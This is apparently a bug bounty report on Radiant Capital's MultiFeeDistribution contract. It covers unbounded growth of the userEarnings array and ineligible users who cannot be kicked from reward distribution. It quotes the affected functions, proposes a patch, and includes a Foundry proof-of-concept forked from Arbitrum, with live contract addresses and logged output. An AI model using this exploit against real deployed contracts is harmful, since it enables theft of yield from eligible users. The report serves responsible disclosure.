# DoS possibility by gas griefing in MultiFeeDistribution because of `userEarnings`.

## Bug Description
Each successful bounty kicking will vest RDNT rewards and increase array length of `userEarnings[user]` by one.

Array length can grow enough to cause following functions which traverses with `userEarnings[user]` to be DoSed.

- [`MultiFeeDistribution.zapVestingToLp()`](https://github.com/radiant-capital/v2/blob/main/contracts/radiant/staking/MultiFeeDistribution.sol#L1002-L1026)
```
	function zapVestingToLp(address _user) external override returns (uint256 zapped) {
		...
		LockedBalance[] storage earnings = userEarnings[_user];
		for (uint256 i = earnings.length; i > 0; i -= 1) {
			if (earnings[i - 1].unlockTime > block.timestamp) {
				zapped = zapped.add(earnings[i - 1].amount);
				earnings.pop();
			} else {
				break;
			}
		}
        ...
		return zapped;
	}
```

- [`MultiFeeDistribution.withdrawableBalance()`](https://github.com/radiant-capital/v2/blob/main/contracts/radiant/staking/MultiFeeDistribution.sol#L427-L443)
```solidity
	function withdrawableBalance(
		address user
	) public view returns (uint256 amount, uint256 penaltyAmount, uint256 burnAmount) {
		uint256 earned = balances[user].earned;
		if (earned > 0) {
			uint256 length = userEarnings[user].length;
			for (uint256 i = 0; i < length; i++) {
				uint256 earnedAmount = userEarnings[user][i].amount;
				if (earnedAmount == 0) continue;
				(, , uint256 newPenaltyAmount, uint256 newBurnAmount) = _penaltyInfo(userEarnings[user][i]);
				penaltyAmount = penaltyAmount.add(newPenaltyAmount);
				burnAmount = burnAmount.add(newBurnAmount);
			}
		}
		amount = balances[user].unlocked.add(earned).sub(penaltyAmount);
		return (amount, penaltyAmount, burnAmount);
	}
```

- [`MultiFeeDistribution.exit()`](https://github.com/radiant-capital/v2/blob/main/contracts/radiant/staking/MultiFeeDistribution.sol#L747-L759)
```
	function exit(bool claimRewards) external override {
		address onBehalfOf = msg.sender;
		(uint256 amount, uint256 penaltyAmount, uint256 burnAmount) = withdrawableBalance(onBehalfOf);

		delete userEarnings[onBehalfOf];
        ...
	}
```
- [`MultiFeeDistribution.withdraw()`](https://github.com/radiant-capital/v2/blob/main/contracts/radiant/staking/MultiFeeDistribution.sol#L645-L702)
```solidity
	function withdraw(uint256 amount) external {
		address _address = msg.sender;
		require(amount != 0, "amt cannot be 0");

		uint256 penaltyAmount;
		uint256 burnAmount;
		Balances storage bal = balances[_address];

		if (amount <= bal.unlocked) {
			bal.unlocked = bal.unlocked.sub(amount);
		} else {
            ...
			for (i = 0; ; i++) {
				uint256 earnedAmount = userEarnings[_address][i].amount;
				if (earnedAmount == 0) continue;
				(, uint256 penaltyFactor, , ) = _penaltyInfo(userEarnings[_address][i]);

                ...
			}
			if (i > 0) {
				for (uint256 j = i; j < userEarnings[_address].length; j++) {
					userEarnings[_address][j - i] = userEarnings[_address][j];
				}
				for (uint256 j = 0; j < i; j++) {
					userEarnings[_address].pop();
				}
			}
			bal.earned = sumEarned;
		}
        ...
	}
```


## Impact

Effectiveness of reward system will be seriously damaged.

- Theft of unclaimed yield. Around 1300 ineligible users can claim reward and bounty hunters cannot kick them out. ( I can provider the list. )

- It will impact eligible user's reward amount negatively.


## Risk Breakdown
Difficulty to Exploit: Easy
Weakness: High
CVSS2 Score: 8.5

## Recommendation
MultiFeeDistribution.claimBounty() should return `false` for those users who have diabled auto-lock and locked amount is smaller than minimum stake amount, so that bounty-hunters can kick them out as ineligible users.

https://github.com/radiant-capital/v2/blob/main/contracts/radiant/staking/MultiFeeDistribution.sol#L1037-L1053
```
	function claimBounty(address _user, bool _execute) public whenNotPaused returns (bool issueBaseBounty) {
		require(msg.sender == address(bountyManager), "!bountyManager");

-		(, uint256 unlockable, , , ) = lockedBalances(_user);
+		(, uint256 unlockable, locked, , ) = lockedBalances(_user);
		if (unlockable == 0) {
			return (false);
		} else {
-			issueBaseBounty = true;
+			issueBaseBounty = autoRelockDisabled[_address] || locked >= IBountyManager(bountyManager).minDLPBalance();
		}

		if (!_execute) {
			return (issueBaseBounty);
		}
		// Withdraw the user's expried locks
		_withdrawExpiredLocksFor(_user, false, true, userLocks[_user].length);
	}
```

## Proof of Concept
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Radiant.sol";

interface IWETH {
  function approve(address spender, uint256 value) external returns (bool);

  function deposit() payable external;

  function balanceOf(address) external view returns (uint256);
}

interface BountyManager {
	function minDLPBalance() external view returns (uint256 min);

	function quote(address _user) external view returns (uint256 bounty, uint256 actionType);

	function claim(
		address _user,
		uint256 _actionType) external returns (uint256 bounty, uint256 actionType);
}

struct LockedBalance {
	uint256 amount;
	uint256 unlockTime;
	uint256 multiplier;
	uint256 duration;
}

struct RewardData {
    address token;
    uint256 amount;
}

interface IERC20 {
  function balanceOf(address) external view returns (uint256);
  function name() external view returns (string memory);
  function symbol() external view returns (string memory);
  function decimals() external view returns (uint8);
}

interface MultiFeeDistribution {
    function lockedBalances(address user) external view returns (
			uint256 total,
			uint256 unlockable,
			uint256 locked,
			uint256 lockedWithMultiplier,
			LockedBalance[] memory lockData
		);
    
    function getAllRewards() external;
	function claimableRewards(address account) external view returns (RewardData[] memory rewardsData);
	function rewardTokens(uint256 index) external view returns (address);
}

BountyManager constant          bm = BountyManager(0x90aBACEC5dEEFf349223EeA076c946C2A630B672);
MultiFeeDistribution constant   mfd = MultiFeeDistribution(0x76ba3eC5f5adBf1C58c91e86502232317EeA72dE);

contract RadiantTest is Test {
    address constant        ineligible = 0x4471bCe0280Da4312F12142491B458d7af866c26;
    address constant        kicker = 0xdaC51643888be5414f0272b9fEEF97EDf723203A;
    address constant        weth = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;

    function setUp() public {
        vm.createSelectFork("arbitrum", 122884051);

        vm.label(address(bm), "BountyManager");
        vm.label(address(mfd), "MultiFeeDistribution");
        vm.label(address(lendingPool), "LendingPool");

        for (uint256 i = 0; i < 8; i++) {
            address token = mfd.rewardTokens(i);
            vm.label(token, IERC20(token).symbol());
        }
    }

    function testRadiant() public {
        uint256 bounty;
        uint256 actionType;
        uint256 minDLPBalance = bm.minDLPBalance();
		(, uint256 unlockable, uint256 locked, , ) = mfd.lockedBalances(ineligible);

        (bounty, actionType) = bm.quote(ineligible);

        console.log("kicker", kicker);
        console.log("ineligible", ineligible);
        console.log("unlockable balance", unlockable);
        console.log("locked balance", locked);
        console.log("minDLPBalance", minDLPBalance);
        console.log("bounty", bounty);
        console.log("actionType", actionType);

        vm.startPrank(kicker);
        console.log("Bounty hunting will revert");
        vm.expectRevert();
        (bounty, actionType) = bm.claim(ineligible, 0);
        vm.stopPrank();

        RewardData[] memory rewardsData = mfd.claimableRewards(msg.sender);
        uint256[8] memory prev_balance;
        for (uint256 i = 0; i < 8; i++) {
            prev_balance[i] = IERC20(mfd.rewardTokens(i)).balanceOf(ineligible);
        }

        console.log("Getting All Rewards");
        vm.startPrank(ineligible);
        mfd.getAllRewards();
        vm.stopPrank();

        for (uint256 i = 0; i < 8; i++) {
            IERC20  token = IERC20(rewardsData[i].token);
            uint256 amount = IERC20(mfd.rewardTokens(i)).balanceOf(ineligible) - prev_balance[i];

            console.log("Claimable Reward vs Actual Claimed Reward");
            emit log_named_decimal_uint(token.symbol(), rewardsData[i].amount, token.decimals());
            emit log_named_decimal_uint(token.symbol(), amount,     token.decimals());            
        }
    }
}

```

### Output	
forge test --match-test Radiant -vv --rpc-url=https://arb1.arbitrum.io/rpc --via-ir

```
Logs:
  kicker 0xdaC51643888be5414f0272b9fEEF97EDf723203A
  ineligible 0x4471bCe0280Da4312F12142491B458d7af866c26
  unlockable balance 3004713117103506749
  locked balance 0
  minDLPBalance 4114714080944951659
  bounty 4024832573002211967
  actionType 1
  Bounty hunting will revert
  Getting All Rewards
  Claimable Reward vs Actual Claimed Reward
  RDNT: 0.000000000000000000
  RDNT: 0.000000000000000000
  Claimable Reward vs Actual Claimed Reward
  rWBTC: 0.00000000
  rWBTC: 0.00000005
  Claimable Reward vs Actual Claimed Reward
  rUSDT: 0.000000
  rUSDT: 0.003767
  Claimable Reward vs Actual Claimed Reward
  rUSDC: 0.000000
  rUSDC: 0.012269
  Claimable Reward vs Actual Claimed Reward
  rDAI: 0.000000000000000000
  rDAI: 0.001785739715011331
  Claimable Reward vs Actual Claimed Reward
  rWETH: 0.000000000000000000
  rWETH: 0.000005170344606920
  Claimable Reward vs Actual Claimed Reward
  rWSTETH: 0.000000000000000000
  rWSTETH: 0.000000328811750695
  Claimable Reward vs Actual Claimed Reward
  rARB: 0.000000000000000000
  rARB: 0.000955166777419770
```